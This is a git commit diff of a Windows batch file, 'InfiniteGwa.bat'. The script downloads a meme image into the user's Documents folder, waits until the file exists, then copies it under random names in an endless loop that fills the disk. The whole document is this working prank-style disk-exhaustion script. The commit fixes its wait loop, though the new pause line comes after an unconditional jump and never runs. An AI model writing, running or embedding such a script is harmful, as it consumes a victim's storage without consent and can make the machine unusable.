1c39c41a7c2993621a70fe63790227c0836dc843
Cristiano <59809524+Cristiano100@users.noreply.github.com>
2023-01-24 17:44:18 -0600

    Update InfiniteGwa.bat

--- InfiniteGwa.bat
+++ InfiniteGwa.bat
@@ -2,14 +2,16 @@
 
 curl https://i.kym-cdn.com/entries/icons/facebook/000/038/173/ggccover.jpg --output %USERPROFILE%\Documents\gwa.jpg --ssl-no-revoke
 
-:curlwait
-IF EXISTS %USERPROFILE%\Documents\gwa.jpg goto curlwait
-sleep.exe .1
-goto waitend
-:waitend
 
-goto curlwait
+:checkForGwa
+IF EXIST %USERPROFILE%\Documents\gwa.jpg GOTO gwaExist
+
+GOTO checkForGwa
+TIMEOUT /T 1 >nul
+:gwaExist
 
 :start
 copy %USERPROFILE%\Documents\gwa.jpg %USERPROFILE%\Documents\%RANDOM%GwaGwaGwaGwaGwa%RANDOM%.jpg
 goto start
+
+pause
